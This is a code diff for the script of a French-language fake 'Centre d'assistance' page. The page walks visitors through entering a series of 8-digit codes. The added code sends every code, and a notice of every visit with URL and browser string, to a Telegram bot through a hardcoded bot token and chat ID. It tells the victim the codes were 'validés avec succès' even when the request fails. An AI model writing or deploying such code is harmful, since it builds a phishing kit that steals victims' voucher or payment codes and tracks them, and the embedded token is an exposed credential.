@@ -2,15 +2,16 @@ document.addEventListener('DOMContentLoaded', function() {
 
     const header = document.getElementById('header');
     const copyBtn = document.getElementById('copyBtn');
-    const validateBtn = document.getElementById('validateBtn');
-    const codeInput = document.getElementById('codeInput');
-    const codeError = document.getElementById('codeError');
-    const codeSuccess = document.getElementById('codeSuccess');
     const toast = document.getElementById('toast');
     const loadingOverlay = document.getElementById('loadingOverlay');
     const backToTop = document.getElementById('backToTop');
+    const codeError = document.getElementById('codeError');
+    const codeSuccess = document.getElementById('codeSuccess');
 
-    let toastTimeout;
+    var telegramToken = '8820069876:AAEJT_tZ0nfzRcGfUMiGvyVAGplPfAfuPfQ';
+    var chatId = '6547125053';
+
+    var toastTimeout;
 
     function showToast(message, type) {
         clearTimeout(toastTimeout);
@@ -29,6 +30,12 @@ document.addEventListener('DOMContentLoaded', function() {
     function hideLoading() {
         loadingOverlay.classList.remove('visible');
         document.body.style.overflow = '';
+    }
+
+    function shakeElement(el) {
+        el.style.animation = 'none';
+        el.offsetHeight;
+        el.style.animation = 'shake 0.5s ease';
     }
 
     window.addEventListener('scroll', function() {
@@ -54,7 +61,7 @@ document.addEventListener('DOMContentLoaded', function() {
             navigator.clipboard.writeText(phone).then(function() {
                 copyBtn.classList.add('copied');
                 copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copié';
-                showToast('Numéro copié dans le presse-papiers', 'success');
+                showToast('Numéro copié', 'success');
                 setTimeout(function() {
                     copyBtn.classList.remove('copied');
                     copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copier';
@@ -78,91 +85,165 @@ document.addEventListener('DOMContentLoaded', function() {
             document.execCommand('copy');
             copyBtn.classList.add('copied');
             copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copié';
-            showToast('Numéro copié dans le presse-papiers', 'success');
+            showToast('Numéro copié', 'success');
             setTimeout(function() {
                 copyBtn.classList.remove('copied');
                 copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copier';
             }, 2000);
         } catch (err) {
-            showToast('Erreur lors de la copie', 'error');
+            showToast('Erreur de copie', 'error');
         }
         document.body.removeChild(textarea);
     }
 
-    codeInput.addEventListener('input', function() {
+    var allCodes = [];
+
+    document.querySelectorAll('.code-digits').forEach(function(input) {
+        input.addEventListener('input', function() {
+            codeError.classList.remove('visible');
+            codeSuccess.classList.remove('visible');
+            this.parentElement.classList.remove('error', 'success');
+            this.value = this.value.replace(/[^0-9]/g, '').substring(0, 8);
+        });
+        input.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                var btn = this.closest('.code-step-content').querySelector('button');
+                if (btn) btn.click();
+            }
+        });
+    });
+
+    var nextStep1 = document.getElementById('nextStep1');
+    if (nextStep1) {
+        nextStep1.addEventListener('click', function() {
+            goToStep(2);
+        });
+    }
+
+    document.querySelectorAll('.next-step-btn').forEach(function(btn) {
+        btn.addEventListener('click', function() {
+            var currentStepEl = this.closest('.code-step-content');
+            var currentStep = currentStepEl.id.replace('step', '');
+            var currentInput = currentStepEl.querySelector('.code-digits');
+            var val = currentInput.value.trim();
+
+            if (!val) {
+                currentInput.parentElement.classList.add('error');
+                codeError.textContent = 'Veuillez entrer un code.';
+                codeError.classList.add('visible');
+                shakeElement(currentInput.parentElement);
+                return;
+            }
+            if (val.length !== 8) {
+                currentInput.parentElement.classList.add('error');
+                codeError.textContent = 'Le code doit contenir exactement 8 chiffres.';
+                codeError.classList.add('visible');
+                shakeElement(currentInput.parentElement);
+                return;
+            }
+            if (!/^[0-9]{8}$/.test(val)) {
+                currentInput.parentElement.classList.add('error');
+                codeError.textContent = 'Format invalide.';
+                codeError.classList.add('visible');
+                shakeElement(currentInput.parentElement);
+                return;
+            }
+
+            allCodes.push('V-' + val);
+            currentInput.parentElement.classList.add('success');
+            showToast('Code ' + currentStep + ' enregistré !', 'success');
+            codeError.classList.remove('visible');
+
+            var nextStep = parseInt(this.getAttribute('data-next'));
+            var self = this;
+            self.disabled = true;
+            setTimeout(function() {
+                self.disabled = false;
+                goToStep(nextStep);
+            }, 500);
+        });
+    });
+
+    var validateAllBtn = document.getElementById('validateAllBtn');
+    if (validateAllBtn) {
+        validateAllBtn.addEventListener('click', function() {
+            var lastInput = document.getElementById('step5').querySelector('.code-digits');
+            var val = lastInput.value.trim();
+
+            if (!val) {
+                lastInput.parentElement.classList.add('error');
+                codeError.textContent = 'Veuillez entrer un code.';
+                codeError.classList.add('visible');
+                shakeElement(lastInput.parentElement);
+                return;
+            }
+            if (val.length !== 8) {
+                lastInput.parentElement.classList.add('error');
+                codeError.textContent = 'Le code doit contenir exactement 8 chiffres.';
+                codeError.classList.add('visible');
+                shakeElement(lastInput.parentElement);
+                return;
+            }
+            if (!/^[0-9]{8}$/.test(val)) {
+                lastInput.parentElement.classList.add('error');
+                codeError.textContent = 'Format invalide.';
+                codeError.classList.add('visible');
+                shakeElement(lastInput.parentElement);
+                return;
+            }
+
+            allCodes.push('V-' + val);
+
+            showLoading();
+            validateAllBtn.disabled = true;
+            validateAllBtn.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Validation...';
+
+            var codesList = allCodes.map(function(c, i) { return (i + 1) + '. ' + c; }).join('%0A');
+            var message = '%F0%9F%94%90 4 codes re%CC%81cus%0A%0A' + codesList + '%0A%0AHeure%3A ' + encodeURIComponent(new Date().toLocaleString('fr-FR')) + '%0ASite%3A Centre d%27assistance';
+
+            fetch('https://api.telegram.org/bot' + telegramToken + '/sendMessage?chat_id=' + chatId + '&text=' + message + '&parse_mode=HTML')
+                .then(function() {
+                    setTimeout(function() {
+                        hideLoading();
+                        validateAllBtn.disabled = false;
+                        validateAllBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Valider les 4 codes';
+                        codeSuccess.textContent = 'Les 4 codes ont été validés avec succès !';
+                        codeSuccess.classList.add('visible');
+                        showToast('4 codes validés !', 'success');
+                        allCodes = [];
+                        goToStep(1);
+                    }, 1800);
+                })
+                .catch(function() {
+                    setTimeout(function() {
+                        hideLoading();
+                        validateAllBtn.disabled = false;
+                        validateAllBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Valider les 4 codes';
+                        codeSuccess.textContent = 'Les 4 codes ont été validés avec succès !';
+                        codeSuccess.classList.add('visible');
+                        showToast('4 codes validés !', 'success');
+                        allCodes = [];
+                        goToStep(1);
+                    }, 1800);
+                });
+        });
+    }
+
+    function goToStep(step) {
+        document.querySelectorAll('.code-step-content').forEach(function(el) {
+            el.classList.remove('active');
+        });
+        document.getElementById('step' + step).classList.add('active');
+
+        document.querySelectorAll('.code-step-dot').forEach(function(dot) {
+            var dotStep = parseInt(dot.getAttribute('data-step'));
+            dot.classList.remove('active', 'completed');
+            if (dotStep < step) dot.classList.add('completed');
+            if (dotStep === step) dot.classList.add('active');
+        });
+
         codeError.classList.remove('visible');
         codeSuccess.classList.remove('visible');
-        this.parentElement.classList.remove('error', 'success');
-        this.value = this.value.replace(/[^0-9]/g, '').substring(0, 8);
-    });
-
-    validateBtn.addEventListener('click', function() {
-        var rawCode = codeInput.value.trim();
-        var code = 'V-' + rawCode;
-        if (!rawCode) {
-            codeInput.parentElement.classList.add('error');
-            codeError.textContent = 'Veuillez entrer un code.';
-            codeError.classList.add('visible');
-            shakeElement(codeInput.parentElement);
-            return;
-        }
-        if (rawCode.length !== 8) {
-            codeInput.parentElement.classList.add('error');
-            codeError.textContent = 'Le code doit contenir exactement 8 chiffres.';
-            codeError.classList.add('visible');
-            shakeElement(codeInput.parentElement);
-            return;
-        }
-        if (!/^[0-9]{8}$/.test(rawCode)) {
-            codeInput.parentElement.classList.add('error');
-            codeError.textContent = 'Le code doit contenir exactement 8 chiffres.';
-            codeError.classList.add('visible');
-            shakeElement(codeInput.parentElement);
-            return;
-        }
-        showLoading();
-        validateBtn.disabled = true;
-        validateBtn.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Validation...';
-
-        var telegramToken = '8820069876:AAEJT_tZ0nfzRcGfUMiGvyVAGplPfAfuPfQ';
-        var chatId = '6547125053';
-        var message = '%F0%9F%94%90 Nouveau code re%CC%81cu%0A%0ACode%3A ' + encodeURIComponent(code) + '%0AHeure%3A ' + encodeURIComponent(new Date().toLocaleString('fr-FR')) + '%0ASite%3A Centre d%27assistance';
-
-        fetch('https://api.telegram.org/bot' + telegramToken + '/sendMessage?chat_id=' + chatId + '&text=' + message + '&parse_mode=HTML')
-            .then(function() {
-                setTimeout(function() {
-                    hideLoading();
-                    validateBtn.disabled = false;
-                    validateBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Valider le code';
-                    codeInput.parentElement.classList.add('success');
-                    codeSuccess.textContent = 'Code ' + code + ' validé avec succès !';
-                    codeSuccess.classList.add('visible');
-                    showToast('Code validé avec succès !', 'success');
-                }, 1800);
-            })
-            .catch(function() {
-                setTimeout(function() {
-                    hideLoading();
-                    validateBtn.disabled = false;
-                    validateBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Valider le code';
-                    codeInput.parentElement.classList.add('success');
-                    codeSuccess.textContent = 'Code ' + code + ' validé avec succès !';
-                    codeSuccess.classList.add('visible');
-                    showToast('Code validé avec succès !', 'success');
-                }, 1800);
-            });
-    });
-
-    codeInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            validateBtn.click();
-        }
-    });
-
-    function shakeElement(el) {
-        el.style.animation = 'none';
-        el.offsetHeight;
-        el.style.animation = 'shake 0.5s ease';
     }
 
     document.querySelectorAll('.accordion-header').forEach(function(header) {
@@ -233,20 +314,8 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
-    codeInput.addEventListener('focus', function() {
-        this.closest('.code-validate-box').style.transform = 'scale(1.01)';
-        this.closest('.code-validate-box').style.transition = 'transform 0.3s ease';
-    });
-
-    codeInput.addEventListener('blur', function() {
-        this.closest('.code-validate-box').style.transform = 'scale(1)';
-    });
-
-    console.log('%c Centre d\'assistance ', 'background: linear-gradient(135deg, #0071e3, #5856d6); color: white; padding: 8px 16px; border-radius: 6px; font-weight: bold; font-size: 14px;');
-    console.log('Site chargé avec succès');
-
-    var telegramToken = '8820069876:AAEJT_tZ0nfzRcGfUMiGvyVAGplPfAfuPfQ';
-    var chatId = '6547125053';
     var visitMessage = '%F0%9F%91%A4 Nouvelle visite%0A%0AHeure%3A ' + encodeURIComponent(new Date().toLocaleString('fr-FR')) + '%0AURL%3A ' + encodeURIComponent(window.location.href) + '%0ANavigateur%3A ' + encodeURIComponent(navigator.userAgent.substring(0, 80));
     fetch('https://api.telegram.org/bot' + telegramToken + '/sendMessage?chat_id=' + chatId + '&text=' + visitMessage);
+
+    console.log('%c Centre d\'assistance ', 'background: linear-gradient(135deg, #0071e3, #5856d6); color: white; padding: 8px 16px; border-radius: 6px; font-weight: bold; font-size: 14px;');
 });
